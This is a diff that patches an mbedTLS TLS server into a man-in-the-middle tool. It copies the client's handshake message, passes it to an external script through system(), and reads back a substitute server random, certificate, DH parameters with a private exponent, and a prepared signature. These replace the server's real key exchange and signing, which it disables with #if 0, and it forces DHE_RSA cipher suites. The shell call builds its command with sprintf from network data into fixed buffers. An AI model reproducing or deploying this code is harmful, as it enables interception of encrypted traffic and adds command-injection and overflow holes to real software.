@@ -49,6 +49,15 @@
 #include <time.h>
 #endif
 
+static unsigned char ch_hsmsg[2048]  = {0}; static size_t ch_hsmsg_len  = 0;
+static unsigned char srvrandom[32]   = {0}; static size_t srvrandom_len = 0;
+static unsigned char crt_hsmsg[8192] = {0}; static size_t crt_hsmsg_len = 0;
+static unsigned char dhparam_p[256]  = {0}; static size_t dhparam_p_len = 0;
+static unsigned char dhparam_g[256]  = {0}; static size_t dhparam_g_len = 0;
+static unsigned char dhparam_x[256]  = {0}; static size_t dhparam_x_len = 0;
+static unsigned char dhparam_y[256]  = {0}; static size_t dhparam_y_len = 0;
+static unsigned char shellosig[512]  = {0}; static size_t shellosig_len = 0;
+
 #if defined(MBEDTLS_SSL_SESSION_TICKETS)
 /* Implementation that should never be optimized out by the compiler */
 static void mbedtls_zeroize( void *v, size_t n ) {
@@ -484,6 +493,8 @@ static int ssl_parse_session_ticket_ext( mbedtls_ssl_context *ssl,
 
         return( 0 );
     }
+
+    return 0;
 
     /*
      * Keep the session ID sent by the client, since we MUST send it back to
@@ -1226,6 +1237,9 @@ read_record_header:
 
     ssl->handshake->update_checksum( ssl, buf, msg_len );
 
+    memcpy(ch_hsmsg, ssl->in_msg, msg_len);
+    ch_hsmsg_len = msg_len;
+
     /*
      * Handshake layer:
      *     0  .   0   handshake type
@@ -1809,6 +1823,8 @@ read_record_header:
                 return( ret );
 
             if( ciphersuite_info != NULL )
+              if (ciphersuite_info->key_exchange
+                  == MBEDTLS_KEY_EXCHANGE_DHE_RSA)
                 goto have_ciphersuite;
         }
     }
@@ -2207,6 +2223,74 @@ static int ssl_write_hello_verify_request( mbedtls_ssl_context *ssl )
 }
 #endif /* MBEDTLS_SSL_DTLS_HELLO_VERIFY */
 
+static unsigned char hexcodec_decoding_translation(unsigned char d)
+{
+    return ((d >= '0' && d <= '9') ? (d - '0'     ) :
+            (d >= 'A' && d <= 'F') ? (d - 'A' + 10) :
+            (d >= 'a' && d <= 'f') ? (d - 'a' + 10) : 0);
+}
+
+static void hexcodec_decode(int n, const void *ibuf, void *obuf)
+{
+    const unsigned char *i = ibuf;
+    unsigned char *o = obuf;
+    if (!(n > 0 && i && o)) return;
+    while (n--) {
+        o[n / 2] = hexcodec_decoding_translation(i[n]);
+        if (n--) {
+            o[(n + 1) / 2] += hexcodec_decoding_translation(i[n]) * 16;
+        } else {
+            break;
+        }
+    }
+}
+
+static void ssl_prepare_mitm_server_hello_states(void)
+{
+    size_t i = 0;
+    FILE *fp = 0;
+    char clienthello[4096]    = {0};
+    char bashcommand[5000]    = {0};
+    char hex_srvrandom[68]    = {0}; size_t hex_srvrandom_len = 0;
+    char hex_crt_hsmsg[16388] = {0}; size_t hex_crt_hsmsg_len = 0;
+    char hex_dhparam_p[516]   = {0}; size_t hex_dhparam_p_len = 0;
+    char hex_dhparam_g[516]   = {0}; size_t hex_dhparam_g_len = 0;
+    char hex_dhparam_x[516]   = {0}; size_t hex_dhparam_x_len = 0;
+    char hex_dhparam_y[516]   = {0}; size_t hex_dhparam_y_len = 0;
+    char hex_signature[1028]  = {0}; size_t hex_signature_len = 0;
+
+    for (i = 0; i < ch_hsmsg_len; ++i) {
+        sprintf(clienthello + 2*i, "%02x", ch_hsmsg[i]);
+    }
+
+    sprintf(bashcommand, "./perform_mitmhello.py c07c %s > /tmp/mitmhello_result.txt", clienthello);
+    system(bashcommand);
+
+    fp = fopen("/tmp/mitmhello_result.txt", "r");
+    if (!fp) {
+        return;
+    }
+
+    fscanf(fp, "srvrandom= %s\n", hex_srvrandom); hex_srvrandom_len = strlen(hex_srvrandom);
+    fscanf(fp, "crt_hsmsg= %s\n", hex_crt_hsmsg); hex_crt_hsmsg_len = strlen(hex_crt_hsmsg);
+    fscanf(fp, "dhparam_p= %s\n", hex_dhparam_p); hex_dhparam_p_len = strlen(hex_dhparam_p);
+    fscanf(fp, "dhparam_g= %s\n", hex_dhparam_g); hex_dhparam_g_len = strlen(hex_dhparam_g);
+    fscanf(fp, "dhparam_x= %s\n", hex_dhparam_x); hex_dhparam_x_len = strlen(hex_dhparam_x);
+    fscanf(fp, "dhparam_y= %s\n", hex_dhparam_y); hex_dhparam_y_len = strlen(hex_dhparam_y);
+    fscanf(fp, "shellosig= %s\n", hex_signature); hex_signature_len = strlen(hex_signature);
+    fclose(fp);
+
+    hexcodec_decode((int) hex_srvrandom_len, hex_srvrandom, srvrandom); srvrandom_len = hex_srvrandom_len / 2;
+    hexcodec_decode((int) hex_crt_hsmsg_len, hex_crt_hsmsg, crt_hsmsg); crt_hsmsg_len = hex_crt_hsmsg_len / 2;
+    hexcodec_decode((int) hex_dhparam_p_len, hex_dhparam_p, dhparam_p); dhparam_p_len = hex_dhparam_p_len / 2;
+    hexcodec_decode((int) hex_dhparam_g_len, hex_dhparam_g, dhparam_g); dhparam_g_len = hex_dhparam_g_len / 2;
+    hexcodec_decode((int) hex_dhparam_x_len, hex_dhparam_x, dhparam_x); dhparam_x_len = hex_dhparam_x_len / 2;
+    hexcodec_decode((int) hex_dhparam_y_len, hex_dhparam_y, dhparam_y); dhparam_y_len = hex_dhparam_y_len / 2;
+    hexcodec_decode((int) hex_signature_len, hex_signature, shellosig); shellosig_len = hex_signature_len / 2;
+
+    //system("rm -f /tmp/mitmhello_result.txt");
+}
+
 static int ssl_write_server_hello( mbedtls_ssl_context *ssl )
 {
 #if defined(MBEDTLS_HAVE_TIME)
@@ -2215,6 +2299,16 @@ static int ssl_write_server_hello( mbedtls_ssl_context *ssl )
     int ret;
     size_t olen, ext_len = 0, n;
     unsigned char *buf, *p;
+
+    ssl_prepare_mitm_server_hello_states();
+
+    MBEDTLS_SSL_DEBUG_BUF(1, "mitm hello srvrandom", srvrandom, srvrandom_len);
+    MBEDTLS_SSL_DEBUG_BUF(1, "mitm hello crt_hsmsg", crt_hsmsg, crt_hsmsg_len);
+    MBEDTLS_SSL_DEBUG_BUF(1, "mitm hello dhparam_p", dhparam_p, dhparam_p_len);
+    MBEDTLS_SSL_DEBUG_BUF(1, "mitm hello dhparam_g", dhparam_g, dhparam_g_len);
+    MBEDTLS_SSL_DEBUG_BUF(1, "mitm hello dhparam_x", dhparam_x, dhparam_x_len);
+    MBEDTLS_SSL_DEBUG_BUF(1, "mitm hello dhparam_y", dhparam_y, dhparam_y_len);
+    MBEDTLS_SSL_DEBUG_BUF(1, "mitm hello shellosig", shellosig, shellosig_len);
 
     MBEDTLS_SSL_DEBUG_MSG( 2, ( "=> write server hello" ) );
 
@@ -2271,6 +2365,8 @@ static int ssl_write_server_hello( mbedtls_ssl_context *ssl )
         return( ret );
 
     p += 28;
+
+    memcpy(buf + 6, srvrandom, 32);
 
     memcpy( ssl->handshake->randbytes + 32, buf + 6, 32 );
 
@@ -2424,6 +2520,14 @@ static int ssl_write_server_hello( mbedtls_ssl_context *ssl )
     ret = mbedtls_ssl_write_record( ssl );
 
     MBEDTLS_SSL_DEBUG_MSG( 2, ( "<= write server hello" ) );
+
+    MBEDTLS_SSL_DEBUG_MSG( 2, ( "=> write prepared certificate" ) );
+    ssl->out_msgtype = MBEDTLS_SSL_MSG_HANDSHAKE;
+    ssl->out_msglen = crt_hsmsg_len;
+    memcpy(ssl->out_msg, crt_hsmsg, crt_hsmsg_len);
+    ret = mbedtls_ssl_write_record(ssl);
+    ssl->state += 1;
+    MBEDTLS_SSL_DEBUG_MSG( 2, ( "<= write prepared certificate" ) );
 
     return( ret );
 }
@@ -2730,6 +2834,7 @@ static int ssl_write_server_key_exchange( mbedtls_ssl_context *ssl )
     if( ciphersuite_info->key_exchange == MBEDTLS_KEY_EXCHANGE_DHE_RSA ||
         ciphersuite_info->key_exchange == MBEDTLS_KEY_EXCHANGE_DHE_PSK )
     {
+#if 0
         if( ssl->conf->dhm_P.p == NULL || ssl->conf->dhm_G.p == NULL )
         {
             MBEDTLS_SSL_DEBUG_MSG( 1, ( "no DH parameters set" ) );
@@ -2758,6 +2863,38 @@ static int ssl_write_server_key_exchange( mbedtls_ssl_context *ssl )
         {
             MBEDTLS_SSL_DEBUG_RET( 1, "mbedtls_dhm_make_params", ret );
             return( ret );
+        }
+#endif
+        {
+            size_t n;
+            unsigned char *ptr = p;
+
+            ssl->handshake->dhm_ctx.len = dhparam_p_len;
+
+            mbedtls_mpi_read_binary(&ssl->handshake->dhm_ctx.P, dhparam_p, dhparam_p_len);
+            mbedtls_mpi_read_binary(&ssl->handshake->dhm_ctx.G, dhparam_g, dhparam_g_len);
+            mbedtls_mpi_read_binary(&ssl->handshake->dhm_ctx.X, dhparam_x, dhparam_x_len);
+            mbedtls_mpi_read_binary(&ssl->handshake->dhm_ctx.GX,dhparam_y, dhparam_y_len);
+
+            n = mbedtls_mpi_size(&ssl->handshake->dhm_ctx.P);
+            mbedtls_mpi_write_binary(&ssl->handshake->dhm_ctx.P, ptr + 2, n);
+            ptr[0] = (unsigned char)(n >> 8);
+            ptr[1] = (unsigned char)(n     );
+            ptr += 2 + n;
+
+            n = mbedtls_mpi_size(&ssl->handshake->dhm_ctx.G);
+            mbedtls_mpi_write_binary(&ssl->handshake->dhm_ctx.G, ptr + 2, n);
+            ptr[0] = (unsigned char)(n >> 8);
+            ptr[1] = (unsigned char)(n     );
+            ptr += 2 + n;
+
+            n = mbedtls_mpi_size(&ssl->handshake->dhm_ctx.GX);
+            mbedtls_mpi_write_binary(&ssl->handshake->dhm_ctx.GX, ptr + 2, n);
+            ptr[0] = (unsigned char)(n >> 8);
+            ptr[1] = (unsigned char)(n     );
+            ptr += 2 + n;
+
+            len = ptr - p;
         }
 
         dig_signed = p;
@@ -2966,6 +3103,7 @@ curve_matching_done:
             return( MBEDTLS_ERR_SSL_PRIVATE_KEY_REQUIRED );
         }
 
+#if 0
 #if defined(MBEDTLS_SSL_PROTO_TLS1_2)
         if( ssl->minor_ver == MBEDTLS_SSL_MINOR_VERSION_3 )
         {
@@ -2991,6 +3129,10 @@ curve_matching_done:
         MBEDTLS_SSL_DEBUG_BUF( 3, "my signature", p, signature_len );
 
         n += signature_len;
+#endif
+        (void) signature_len;
+        memcpy(p, shellosig, shellosig_len);
+        n += shellosig_len;
     }
 #endif /* MBEDTLS_KEY_EXCHANGE_DHE_RSA_ENABLED) ||
           MBEDTLS_KEY_EXCHANGE_ECDHE_RSA_ENABLED ||
